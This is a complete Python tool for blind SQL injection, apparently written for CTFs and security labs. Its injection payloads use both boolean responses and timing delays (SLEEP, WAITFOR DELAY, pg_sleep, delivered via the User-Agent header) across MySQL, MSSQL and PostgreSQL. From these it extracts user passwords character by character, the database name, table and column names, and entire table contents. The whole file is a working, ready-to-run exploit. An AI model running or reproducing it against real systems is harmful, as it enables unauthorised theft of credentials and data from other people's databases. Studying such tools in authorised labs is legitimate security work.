# Full unified script combining status-based and timing-based inference, with password, row, and db-name extraction

import argparse
import requests
import json
import time
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

"""
(c) Roger Dooley
Reusable Scripts for Security Labs and PoCs

These utilities were developed to support offensive security training, PoC delivery, and CTF workflows.
Free to use, modify, and share for lawful educational or testing purposes. Attribution required if redistributed.
"""

def status_oracle(user, target_url, query, proxies=None):
    payload = quote_plus(f"{user}' AND ({query})-- -")
    r = requests.get(f"{target_url}?u={payload}", proxies=proxies)
    try:
        j = json.loads(r.text)
        return j['status'] == 'taken'
    except json.JSONDecodeError:
        return False


def timing_oracle(query, target_url, delay=3, dbms="mysql", proxies=None):
    if dbms == "mysql":
        payload = f"'; IF({query}, SLEEP({delay}), 0)-- -"
    elif dbms == "mssql":
        payload = f"';IF({query}) WAITFOR DELAY '0:0:{delay}'--"
    elif dbms == "postgresql":
        # PostgreSQL doesn't use WAITFOR or SLEEP in this way inside headers; assume pg_sleep
        payload = f"';SELECT CASE WHEN {query} THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
    else:
        raise ValueError("Unsupported DBMS for timing inference.")

    headers = {
        "User-Agent": payload
    }
    start = time.time()
    r = requests.get(target_url, headers=headers, proxies=proxies)
    elapsed = time.time() - start
    return elapsed >= delay


def dumpNumber(query, oracle_fn):
    value = 0
    for p in range(12):  # allow values up to 4096
        if oracle_fn(f"({query}) & {1 << p} > 0"):
            value |= (1 << p)
    return value


def dumpString(query, length, oracle_fn):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle_fn(f"ASCII(SUBSTRING(({query}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val


def count_rows(user, target_url, oracle_fn, proxies=None):
    i = 0
    while True:
        if not oracle_fn(f"(SELECT COUNT(*) FROM users) > {i}"):
            print(f"[*] Row count is {i}")
            break
        i += 1
        print(f"[*] Count test: {i}")


def password_length(oracle_fn):
    length = 1
    while not oracle_fn(f"LEN(password)={length}"):
        length += 1
    print(f"[*] Password length: {length}")
    return length


def extract_password(pwl, oracle_fn):
    print("[*] Password = ", end='', flush=True)
    for i in range(1, pwl + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if oracle_fn(f"ASCII(SUBSTRING(password,{i},1))={mid}"):
                print(chr(mid), end='', flush=True)
                break
            elif oracle_fn(f"ASCII(SUBSTRING(password,{i},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
    print()


def guess_char(position, oracle_fn):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if oracle_fn(f"ASCII(SUBSTRING(password,{position},1))={mid}"):
            return (position, chr(mid))
        elif oracle_fn(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return (position, '?')


def extract_password_threaded(pwl, oracle_fn, max_workers=4):
    print("[*] Extracting password using threading...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(guess_char, i, oracle_fn) for i in range(1, pwl + 1)]
    result = sorted([f.result() for f in futures], key=lambda x: x[0])
    password = ''.join(char for (_, char) in result)
    print(f"[*] Password = {password}")


def get_db_function(dbms):
    if dbms == "mysql":
        return "database()"
    elif dbms == "postgresql":
        return "current_schema()"
    elif dbms == "mssql":
        return "DB_NAME()"
    else:
        raise ValueError("Unsupported DBMS")


def list_tables(db_name, oracle_fn, dbms):
    if dbms in ["mysql", "postgresql"]:
        count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
        table_count = dumpNumber(count_query, oracle_fn)
        print(f"[*] Number of tables in '{db_name}': {table_count}")

        for i in range(table_count):
            name_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' ORDER BY table_name LIMIT {i},1"
            len_query = f"LENGTH(({name_query}))"
            length = dumpNumber(len_query, oracle_fn)
            table_name = dumpString(name_query, length, oracle_fn)
            print(f"[+] Table {i}: {table_name}")

    elif dbms == "mssql":
        count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='{db_name}'"
        table_count = dumpNumber(count_query, oracle_fn)
        print(f"[*] Number of tables in '{db_name}': {table_count}")

        for i in range(table_count):
            name_query = f"SELECT table_name FROM information_schema.tables WHERE table_catalog='{db_name}' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
            len_query = f"LEN(({name_query}))"
            length = dumpNumber(len_query, oracle_fn)
            table_name = dumpString(name_query, length, oracle_fn)
            print(f"[+] Table {i}: {table_name}")



def list_columns(table, db_name, oracle_fn, dbms):
    if dbms in ["mysql", "postgresql"]:
        count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}'"
        col_count = dumpNumber(count_query, oracle_fn)
        print(f"[*] Number of columns in '{table}': {col_count}")

        for i in range(col_count):
            len_query = f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}' LIMIT {i},1))"
            length = dumpNumber(len_query, oracle_fn)
            name_query = f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}' LIMIT {i},1)"
            col_name = dumpString(name_query, length, oracle_fn)
            print(f"[+] Column {i}: {col_name}")

    elif dbms == "mssql":
        count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}'"
        col_count = dumpNumber(count_query, oracle_fn)
        print(f"[*] Number of columns in '{table}' (DB: {db_name}): {col_count}")

        for i in range(col_count):
            offset = i
            len_query = f"LENGTH((SELECT LEN(column_name) FROM (SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}' ORDER BY column_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY) AS sub))"
            length = dumpNumber(len_query, oracle_fn)
            name_query = f"(SELECT column_name FROM (SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}' ORDER BY column_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY) AS sub)"
            col_name = dumpString(name_query, length, oracle_fn)
            print(f"[+] Column {i}: {col_name}")


def dump_table(table, db_name, oracle_fn, dbms):
    # Get number of columns
    if dbms in ["mysql", "postgresql"]:
        col_count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}'"
    elif dbms == "mssql":
        col_count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}'"
    else:
        raise ValueError("Unsupported DBMS")
    
    col_count = dumpNumber(col_count_query, oracle_fn)
    print(f"[*] Number of columns in '{table}': {col_count}")

    # Get column names
    column_names = []
    for i in range(col_count):
        if dbms in ["mysql", "postgresql"]:
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}' ORDER BY ordinal_position LIMIT {i},1"
            len_query = f"LENGTH(({col_query}))"
        elif dbms == "mssql":
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_catalog='{db_name}' ORDER BY ordinal_position OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
            len_query = f"LEN(({col_query}))"

        length = dumpNumber(len_query, oracle_fn)
        col_name = dumpString(col_query, length, oracle_fn)
        column_names.append(col_name)

    print(f"[*] Columns: {', '.join(column_names)}")

    # Get number of rows
    row_count_query = f"SELECT COUNT(*) FROM {table}"
    row_count = dumpNumber(row_count_query, oracle_fn)
    print(f"[*] Number of rows in '{table}': {row_count}")

    # Dump row values
    for r in range(row_count):
        row_data = []
        for c in range(col_count):
            col = column_names[c]
            if dbms in ["mysql", "postgresql"]:
                cell_query = f"SELECT {col} FROM {table} ORDER BY {col} LIMIT {r},1"
                len_query = f"LENGTH(({cell_query}))"
            elif dbms == "mssql":
                cell_query = f"SELECT {col} FROM {table} ORDER BY {col} OFFSET {r} ROWS FETCH NEXT 1 ROWS ONLY"
                len_query = f"LEN(({cell_query}))"

            length = dumpNumber(len_query, oracle_fn)
            value = dumpString(cell_query, length, oracle_fn)
            row_data.append(value)
        print(f"[{r}] {row_data}")


def get_database_expression(dbms):
    if dbms == "mysql":
        return "database()", "LENGTH(database())"
    elif dbms == "postgresql":
        return "current_database()", "LENGTH(current_database())"
    elif dbms == "mssql":
        return "DB_NAME()", "LEN(DB_NAME())"
    else:
        raise ValueError("Unsupported DBMS")

def extract_db_name(oracle_fn, dbms):
    db_expr, db_len_expr = get_database_expression(dbms)
    print("[*] Extracting database name...")
    db_len = dumpNumber(db_len_expr, oracle_fn)
    print(f"[*] Database name length: {db_len}")
    db_name = dumpString(db_expr, db_len, oracle_fn)
    print(f"[*] Database name: {db_name}")
    return db_name

def parse_args():
    parser = argparse.ArgumentParser(description="Blind SQLi automation script")
    parser.add_argument("--rows", action="store_true", help="Find number of rows in users table")
    parser.add_argument("--password-length", action="store_true", help="Find password length for user")
    parser.add_argument("--password", action="store_true", help="Extract password for user")
    parser.add_argument("--threaded", action="store_true", help="Use threaded password extraction")
    parser.add_argument("--extract-db-name", action="store_true", help="Dump database name")
    parser.add_argument("--list-tables", action="store_true", help="List table names in current database")
    parser.add_argument("--list-columns", metavar="TABLE", help="List column names in specified table")
    parser.add_argument("--dump-table", metavar="TABLE", help="Dump all rows and columns from specified table")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://10.10.10.10/api/check-username.php)")
    parser.add_argument("--user", required=True, help="Target username (e.g., maria)")
    parser.add_argument("--proxies", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--use-timing", action="store_true", help="Use timing-based oracle via header injection")
    parser.add_argument("--delay", type=int, default=3, help="Response delay in seconds for timing inference")
    parser.add_argument("--dbms", choices=["mysql", "mssql", "postgresql"], default="mysql", help="Database type for timing inference")
    parser.add_argument("--db-name", help="Manually specify the database name (overrides extraction)")
    return parser.parse_args()


def main():
    args = parse_args()
    proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None

    if args.use_timing:
        oracle_fn = lambda q: timing_oracle(q, args.target, delay=args.delay, dbms=args.dbms, proxies=proxies)
    else:
        oracle_fn = lambda q: status_oracle(args.user, args.target, q, proxies=proxies)

    db_name = None
    if any([args.list_tables, args.list_columns, args.dump_table]):
        db_name = args.db_name or extract_db_name(oracle_fn, args.dbms)

    if args.rows:
        count_rows(args.user, args.target, oracle_fn, proxies)

    if args.password_length:
        length = password_length(oracle_fn)
        print(f"[*] Password length = {length}")

    if args.password:
        length = password_length(oracle_fn)
        extract_password(length, oracle_fn)

    if args.threaded:
        length = password_length(oracle_fn)
        extract_password_threaded(length, oracle_fn)

    if args.extract_db_name:
        db_name = extract_db_name(oracle_fn, args.dbms)        # db_name already printed in extract_db_name()
        pass

    if args.list_tables:
        list_tables(db_name, oracle_fn, args.dbms)

    if args.list_columns:
        list_columns(args.list_columns, db_name, oracle_fn, args.dbms)

    if args.dump_table:
        dump_table(args.dump_table, db_name, oracle_fn, args.dbms)

if __name__ == "__main__":
    main()

